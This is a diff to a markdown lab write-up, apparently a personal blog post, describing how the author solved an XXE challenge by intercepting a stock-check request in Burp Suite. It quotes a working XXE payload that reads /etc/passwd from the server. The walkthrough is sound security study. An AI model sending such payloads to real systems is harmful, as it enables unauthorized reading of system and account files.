@@ -26,10 +26,25 @@ Challenge description: Read /etc/passwd by  exploiting XXE(XML External Entity)
 ![2023-10-18_14-29](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/ab0f3280-ed81-4eb6-9059-916666c14bc2)
 
 - I explored the site functionalities and I noticed that the site requests data was xml based.
+
+  ![2023-10-18_20-56](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/8a1000e6-653c-4296-b08e-7770d7d49c9d)
+
+- I intercepted the check stock request with burpsuite and sent it to the repeater
+
+![2023-10-18_20-59](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/4d1cc80c-59a1-4b81-9f77-089634fb91fe)
+
+- To read the file "/etc/passwd", I used this payload from hacktrickz.com
+
+       <?xml version="1.0" encoding="UTF-8"?>
+       <!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
+        <stockCheck><productId>
+         &example;
+        </productId><storeId>1</storeId></stockCheck>
+    
+- And I got this a response from the server showing the contents of the /etc/passwd file
   
-![Uploading 2023-10-18_20-56.png…]()
+![2023-10-18_21-14![2023-10-18_21-14](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/6252eb19-98b1-4895-8fc0-1585b75c71ea)
 
--I intercepted the check stock request with burpsuite.
+- I right clicked on the repeater and showed response in browser and that was how I solved the first challenge
 
-
-![Uploading 2023-10-18_20-59.png…]()
+![2023-10-18_21-18](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/e722aebe-a491-472b-8447-c14e3e14bf20)
